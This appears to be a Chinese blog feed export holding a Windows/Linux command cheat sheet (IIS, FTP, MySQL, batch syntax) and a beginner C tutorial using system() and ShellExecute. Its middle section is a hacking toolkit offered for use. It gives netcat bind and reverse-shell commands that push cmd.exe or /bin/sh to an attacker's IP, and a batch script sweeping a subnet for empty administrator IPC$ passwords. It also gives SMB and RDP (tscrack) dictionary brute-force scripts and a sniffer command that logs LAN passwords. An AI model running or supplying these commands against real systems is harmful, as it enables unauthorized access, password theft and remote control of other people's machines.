在本地系统上启用（禁用）Internet服务的重新启动<br>iisreset &#x2F;rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>iisreset &#x2F;noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>iisreset &#x2F;timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定&#x2F;rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>FTP 命令：（后面有详细说明内容）<br>ftp的命令行格式为：<br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>－d 使用调试方式。<br>－n 限制ftp的自动登录，即不使用.netrc文件。<br>－g 取消全局文件名。<br>help [命令] 或 ？[命令] 查看命令说明<br>bye 或 quit 终止主机FTP进程，并退出FTP管理方式.<br>pwd 列出当前远端主机目录<br>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>mget [remote-files] 从远端主机接收一批文件至本地主机<br>mput local-files 将本地主机中一批文件传送至远端主机<br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件，就将结果写至本地文件<br>ascii 设定以ASCII方式传送文件（缺省值）<br>bin 或 image 设定以二进制方式传送文件<br>bell 每完成一次文件传送，报警提示<br>cdup 返回上一级目录<br>close 中断与远程服务器的ftp会话（与open对应）<br>open host[port] 建立指定ftp服务器连接，可指定连接端口<br>delete 删除远端主机中的文件<br>mdelete [remote-files] 删除一批文件<br>mkdir directory-name 在远端主机中建立目录<br>rename [from] [to] 改变远端主机中的文件名<br>rmdir directory-name 删除远端主机中的目录<br>status 显示当前FTP的状态<br>system 显示远端主机系统类型<br>user user-name [password] [account] 重新以别的用户名登录远端主机<br>open host [port] 重新建立一个新的连接<br>prompt 交互提示模式<br>macdef 定义宏命令<br>lcd 改变当前本地主机的工作目录，如果缺省，就转到当前用户的HOME目录<br>chmod 改变远端主机的文件权限<br>case 当为ON时，用MGET命令拷贝的文件名到本地机器中，全部转换为小写字母<br>cd remote－dir 进入远程主机目录<br>cdup 进入远程主机目录的父目录<br>! 在本地机中执行交互shell，exit回到ftp环境，如!ls</em>.zip</li></ol><p>#5<br>MYSQL 命令<br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL；如果刚安装好MYSQL，超级用户root是没有密码的。<br>（例：mysql -h110.110.110.110 -Uroot -P123456<br>注：u与root可以不用加空格，其它也一样）<br>exit 退出MYSQL<br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>use mysql；<br>show tables; 显示库中的数据表<br>describe 表名； 显示数据表的结构<br>create database 库名； 建库<br>use 库名；<br>create table 表名 （字段设定列表）； 建表<br>drop database 库名；<br>drop table 表名； 删库和删表<br>delete from 表名； 将表中记录清空<br>select * from 表名； 显示表中的记录<br>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）；注释：将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br>win2003系统下新增命令（实用部份）：<br>shutdown &#x2F;参数 关闭或重启本地或远程主机。<br>参数说明：&#x2F;S 关闭主机，&#x2F;R 重启主机， &#x2F;T 数字 设定延时的时间，范围0～180秒之间， &#x2F;A取消开机，&#x2F;M &#x2F;&#x2F;IP 指定的远程主机。<br>例：shutdown &#x2F;r &#x2F;t 0 立即重启本地主机（无延时）<br>taskkill &#x2F;参数 进程名或进程的pid 终止一个或多个任务和进程。<br>参数说明：&#x2F;PID 要终止进程的pid，可用tasklist命令获得各进程的pid，&#x2F;IM 要终止的进程的进程名，&#x2F;F 强制终止进程，&#x2F;T 终止指定的进程及他所启动的子进程。<br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID）。<br>参数说明：&#x2F;M 列出当前进程加载的dll文件，&#x2F;SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。<br>Linux系统下基本命令　注：要区分大小写<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件，ls -al 显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　&#x2F;返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）<br>批处理命令与变量<br>1：for命令及变量 基本格式<br>FOR &#x2F;参数 %variable IN (set) DO command [command_parameters] %variable：指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass &#x2F;user:user 中ip为%1,pass为%2,user为%3<br>(set）：指定一个或一组文件，可使用通配符，如：（D:user.txt）和（1 1 254)(1 -1 254),{ “（1 1 254）”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“（1 -1 254）”说明：即从254到1 }<br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>command_parameters：为特定命令指定参数或命令行开关<br>IN (set）：指在（set）中取值；DO command ：指执行command<br>参数：&#x2F;L 指用增量形式{ (set）为增量形式时 }；&#x2F;F 指从文件中不断取值，直到取完为止{ (set）为文件时，如（d:pass.txt）时 }。<br>用法举例：<br>@echo off<br>echo 用法格式：test.bat <em>.</em>.* &gt; test.txt<br>for &#x2F;L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G &#x2F;user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>&#x2F;L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量（ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；（1 1 254) 指起始值，增长量，结止值。<br>@echo off<br>echo 用法格式：ok.bat ip<br>FOR &#x2F;F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200<br>存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>七：<br>2：if命令及变量 基本格式<br>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。<br>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>IF [not] 字符串1&#x3D;&#x3D;字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>例：“if “%2%”&#x3D;&#x3D;”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。<br>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1&#x3D;&#x3D;字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”<br>系统外部命令<br>注：系统外部命令（均需下载相关工具）<br>瑞士军刀：nc.exe<br>参数说明：<br>-h 查看帮助信息<br>-d 后台模式<br>-e prog程序重定向，一但连接就执行[危险]<br>-i secs延时的间隔<br>-l 监听模式，用于入站连接<br>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>-n IP地址，不能用域名<br>-o film记录16进制的传输<br>-p[空格]端口 本地端口号<br>-r 随机本地及远程端口<br>-t 使用Telnet交互方式<br>-u UDP模式<br>-v 详细输出，用-vv将更详细<br>-w数字 timeout延时间隔<br>-z 将输入，输出关掉（用于扫锚时）<br>基本用法：<br>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>nc -l -p 80 开启本机的TCP 80端口并监听<br>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>高级用法：<br>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C，同时把结果输出到c:log.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C，并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</span><br><span class="line">type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C，并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</span><br><span class="line">本机上用：nc -l -p 本机端口</span><br><span class="line">在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</span><br><span class="line">nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</span><br><span class="line">本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</span><br><span class="line">在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">备 注：</span><br><span class="line">| 管道命令</span><br><span class="line">&lt; 或 &gt; 重定向命令。“&lt;；”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</span><br><span class="line">@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</span><br><span class="line">&gt;与&gt;&gt;的区别 &quot;&gt;&quot;指：覆盖；&quot;&gt;&gt;&quot;指：保存到（添加到）。</span><br><span class="line">如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</span><br><span class="line">八：</span><br><span class="line">扫描工具：xscan.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本格式</span><br><span class="line">xscan -host &lt;；起始IP&gt;[-&lt;；终止IP&gt;] &lt;；检测项目&gt; [其他选项] 扫锚&quot;起始IP到终止IP&quot;段的所有主机信息</span><br><span class="line">xscan -file &lt;；主机列表文件名&gt; &lt;；检测项目&gt; [其他选项] 扫锚&quot;主机IP列表文件名&quot;中的所有主机信息</span><br></pre></td></tr></table></figure><p>检测项目<br>-active 检测主机是否存活<br>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>-port 检测常用服务的端口状态<br>-ftp 检测FTP弱口令<br>-pub 检测FTP服务匿名用户写权限<br>-pop3 检测POP3-Server弱口令<br>-smtp 检测SMTP-Server漏洞<br>-sql 检测SQL-Server弱口令<br>-smb 检测NT-Server弱口令<br>-iis 检测IIS编码&#x2F;解码漏洞<br>-cgi 检测CGI漏洞<br>-nasl 加载Nessus攻击脚本<br>-all 检测以上所有项目<br>其它选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 适配器编号 设置网络适配器，&lt;；适配器编号&gt;可通过&quot;-l&quot;参数获取</span><br></pre></td></tr></table></figure><p>-l 显示所有网络适配器<br>-v 显示详细扫描进度<br>-p 跳过没有响应的主机<br>-o 跳过没有检测到开放端口的主机<br>-t 并发线程数量，并发主机数量 指定最大并发线程数量和并发主机数量，默认数量为100,10<br>-log 文件名 指定扫描报告文件名 （后缀为：TXT或HTML格式的文件）<br>用法示例<br>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>九：<br>命令行方式嗅探器： xsniff.exe<br>可捕获局域网内FTP&#x2F;SMTP&#x2F;POP3&#x2F;HTTP协议密码<br>参数说明<br>-tcp 输出TCP数据报<br>-udp 输出UDP数据报<br>-icmp 输出ICMP数据报<br>-pass 过滤密码信息<br>-hide 后台运行<br>-host 解析主机名<br>-addr IP地址 过滤IP地址<br>-port 端口 过滤端口<br>-log 文件名 将输出保存到文件<br>-asc 以ASCII形式输出<br>-hex 以16进制形式输出<br>用法示例<br>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>终端服务密码破解： tscrack.exe<br>参数说明<br>-h 显示使用帮助<br>-v 显示版本信息<br>-s 在屏幕上打出解密能力<br>-b 密码错误时发出的声音<br>-t 同是发出多个连接（多线程）<br>-N Prevent System Log entries on targeted server<br>-U 卸载移除tscrack组件<br>-f 使用－f后面的密码<br>-F 间隔时间（频率）<br>-l 使用－l后面的用户名<br>-w 使用－w后面的密码字典<br>-p 使用－p后面的密码<br>-D 登录主页面<br>用法示例<br>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>@if not exist ipcscan.txt goto noscan<br>@for &#x2F;f “tokens&#x3D;1 delims&#x3D; “ %%i in (3389.txt) do call hack.bat %%i<br>nscan<br>@echo 3389.txt no find or scan faild<br>（①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>@if not exist tscrack.exe goto noscan<br>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>:noscan<br>@echo tscrack.exe no find or scan faild<br>（②存为hack.bat) （运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了）<br>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>其它<br>Shutdown.exe<br>Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>fpipe.exe (TCP端口重定向工具） 在第二篇中有详细说明（端口重定向绕过防火墙）<br>fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息<br>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>OpenTelnet.exe （远程开启telnet工具）<br>opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。<br>NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。<br>ResumeTelnet.exe (OpenTelnet附带的另一个工具）<br>resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>FTP命令详解<br>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>FTP的命令行格式为：<br>ftp -v -d -i -n -g [主机名] ，其中<br>-v 显示远程服务器的所有响应信息<br>-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>-d 使用调试方式；<br>-g 取消全局文件名。<br>FTP使用的内部命令如下（中括号表示可选项）：</p><ol><li>![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：！ls*.zip</li><li>$ macro-ame[args]：执行宏定义macro-name。</li><li>account[password]：提供登录远程系统成功后访问系统资源所需的补充口令。</li><li>append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</li><li>ascii：使用ascii类型传输方式。</li><li>bell：每个命令执行完毕后计算机响铃一次。</li><li>bin：使用二进制文件传输方式。</li><li>bye：退出ftp会话过程。</li><li>case：在使用mget时，将远程主机文件名中的大写转为小写字母。</li><li>cd remote-dir：进入远程主机目录。</li><li>cdup：进入远程主机目录的父目录。</li><li>chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</li><li>close：中断与远程服务器的ftp会话（与open对应）。</li><li>cr：使用asscii方式传输文件时，将回车换行转换为回行。</li><li>delete remote-file：删除远程主机文件。</li><li>debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</li><li>dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</li><li>disconnection：同close。</li><li>form format：将文件传输方式设置为format，缺省为file方式。</li><li>get remote-file[local-file]：将远程主机的文件remote-file传至本地硬盘的local-file。</li><li>glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</li><li>hash：每传输1024字节，显示一个hash符号（#）。</li><li>help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</li><li>idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</li><li>image：设置二进制传输方式（同binary）。</li><li>lcd[dir]：将本地工作目录切换至dir。</li><li>ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</li><li>macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</li><li>mdelete[remote-file]：删除远程主机文件。</li><li>mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile。</li><li>mget remote-files：传输多个远程文件。</li><li>mkdir dir-name：在远程主机中建一目录。</li><li>mls remote-file local-file：同nlist，但可指定多个文件名。</li><li>mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</li><li>modtime file-name：显示远程主机文件的最后修改时间。</li><li>mput local-file：将多个文件传输至远程主机。</li><li>newer file-name：如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</li><li>nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</li><li>nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。</li><li>ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</li><li>open host[port]：建立指定ftp服务器连接，可指定连接端口。</li><li>passive：进入被动传输方式。</li><li>prompt：设置多个文件传输时的交互提示。</li><li>proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</li><li>put local-file[remote-file]：将本地文件local-file传送至远程主机。</li><li>pwd：显示远程主机的当前工作目录。</li><li>quit：同bye，退出ftp会话。</li><li>quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</li><li>recv remote-file[local-file]：同get。</li><li>reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</li><li>rhelp[cmd-name]：请求获得远程主机的帮助。</li><li>rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</li><li>rename[from][to]：更改远程主机文件名。</li><li>reset：清除回答队列。</li><li>restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</li><li>rmdir dir-name：删除远程主机目录。</li><li>runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</li><li>send local-file[remote-file]：同put。</li><li>sendport：设置PORT命令的使用。</li><li>site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</li><li>size file-name：显示远程主机文件大小，如：site idle 7200。</li><li>status：显示当前ftp状态。</li><li>struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</li><li>sunique：将远程主机文件名存储设置为只一（与runique对应）。</li><li>system：显示远程主机的操作系统类型。</li><li>tenex：将文件传输类型设置为TENEX机的所需的类型。</li><li>tick：设置传输时的字节计数器。</li><li>trace：设置包跟踪。</li><li>type[type-name]：设置文件传输类型为type-name，缺省为ascii，如：type binary，设置二进制传输方式。</li><li>umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</li><li>user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</li><li>verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</li><li>?[cmd]：同help.</li></ol><p>内容来自百度百科</p>]]></content>
      
      
      
        <tags>
            
            <tag> C, cmd命令大全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning1</title>
      <link href="/2019/08/29/CLearning1/"/>
      <url>/2019/08/29/CLearning1/</url>
      
        <content type="html"><![CDATA[<h1 id="第一段代码"><a href="#第一段代码" class="headerlink" title="第一段代码"></a>第一段代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;helloworld&quot;);</span><br><span class="line">getchar();//等待输入一个字符</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注释被编译器忽略，注释不影响exe文件的大小</li><li>断点可以分析程序当前的运行状态</li><li>include 的作用<ul><li>包含头文件内容类似与import的库</li><li>一般系统的文件用尖括号，而自己编写的用双引号</li><li>井号与include可以有多个空格，并且最后不需要加分号结尾</li></ul></li><li>main 函数有且只能有一个</li></ul><h1 id="命令行代码"><a href="#命令行代码" class="headerlink" title="命令行代码"></a>命令行代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">system(&quot;ipconfig&quot;); //in windows operate system,print ip info</span><br><span class="line">system(&quot;ping www.qq.com&quot;);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">system(&quot;C:\\文件目录windows的形式&quot;); //system函数的传入参数就是命令行参数</span><br><span class="line">system(&quot;net config&quot;);//查看正在运行的网络服务</span><br><span class="line">system(&quot;netstat -a&quot;);//监听所有程序端口信息</span><br><span class="line">system(&quot;tasklist&quot;);//查看所有任务</span><br><span class="line">system(&quot;route print&quot;);//查看ip路由</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="windows操作"><a href="#windows操作" class="headerlink" title="windows操作"></a>windows操作</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;hello,天朝&quot;);</span><br><span class="line">MessageBox(0,&quot;你好天朝&quot;,&quot;helloworld&quot;,0);</span><br><span class="line">//第一个参数设置为0，第一个参数是依赖的窗口编号，相当于是谁弹出来的</span><br><span class="line">//第二个参数是对话框的内容，</span><br><span class="line">//第三个参数是对话框标题，</span><br><span class="line">//第四个参数是对话框类型，设置成0即可）</span><br><span class="line">ShellExecute(0,&quot;open&quot;,&quot;dir&quot;,0,0,1);</span><br><span class="line">//C语言中双斜杠只代表一个斜杠,windows中的地址一定要注意</span><br><span class="line">//打开一个文件，文件夹</span><br><span class="line">ShellExecute(0,&quot;open&quot;,&quot;url&quot;,0,0,1);</span><br><span class="line">//打开一个网址</span><br><span class="line">ShellExecute(0,&quot;open&quot;,&quot;系统软件命令&quot;,0,0,1);</span><br><span class="line">//例如notepad打开记事本</span><br><span class="line">ShellExecute(0,&quot;print&quot;,&quot;文件名&quot;,0,0,1);</span><br><span class="line">//打印文件</span><br><span class="line">//ShellExecute是windows系统中用于操作的函数</span><br><span class="line">ShellExecute(0,&quot;open&quot;,&quot;mailto&quot;,0,0,1);</span><br><span class="line">//第三个参数替换成mailto：邮件地址即可直接发邮件</span><br><span class="line">/*</span><br><span class="line">参数说明</span><br><span class="line">1.那个窗口执行，0表示系统执行</span><br><span class="line">2.执行什么操作，一般open，print</span><br><span class="line">3.执行的文件路径，网址，邮件地址，可执行文件</span><br><span class="line">4.5.系统一些保留参数，一般为0</span><br><span class="line">6.控制打开的窗口显示（），隐藏（），最大化（1），最小化（6）但是不一定好用</span><br><span class="line">*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="头文件源文件预编译指令"><a href="#头文件源文件预编译指令" class="headerlink" title="头文件源文件预编译指令"></a>头文件源文件预编译指令</h1><ul><li>一般情况下函数的声明应该放在头文件</li><li>函数的实现与变量的定义应当放在源文件</li></ul><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><ul><li>英文是head，后缀是.h,头文件是源文件的辅助文件，一般把一些函数变量，函数定义放到头文件</li></ul><h2 id="源文件"><a href="#源文件" class="headerlink" title="源文件"></a>源文件</h2><ul><li>一般以cpp或c结尾</li><li>cpp可以兼容c</li><li>函数的实现一般在此</li><li>同样的作用域范围，定义不可以重复，文件也不能重复包含（类似与定义重复）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void main() &#123;</span><br><span class="line">printf(&quot;dsjflkasfd&quot;);//无预编译文件无法执行</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 